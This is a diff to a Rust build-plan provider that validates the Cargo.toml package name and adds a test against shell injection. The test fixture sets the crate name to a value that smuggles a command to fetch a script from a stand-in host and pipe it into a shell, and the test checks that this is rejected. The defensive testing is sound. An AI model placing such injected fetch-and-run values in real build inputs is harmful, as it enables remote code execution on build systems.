@@ -37,6 +37,7 @@ impl Provider for RustProvider {
 
     fn plan(&self, ctx: &AppContext) -> Result<BuildPlan> {
         let binary = Self::binary_name(ctx);
+        crate::sanitize::validate_token("Cargo.toml package name", &binary)?;
 
         let build_stage = Stage {
             name: "build".to_string(),
@@ -84,6 +85,21 @@ impl Provider for RustProvider {
 
 #[cfg(test)]
 mod tests {
+    #[test]
+    fn rejects_injection_in_cargo_name() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("Cargo.toml"),
+            "[package]\nname = \"app; curl evil | sh\"\nversion = \"0.1.0\"\n",
+        )
+        .unwrap();
+        let ctx = super::AppContext::new(dir.path()).unwrap();
+        assert!(
+            super::RustProvider.plan(&ctx).is_err(),
+            "shell metachars in crate name must be rejected"
+        );
+    }
+
     use super::*;
 
     #[test]
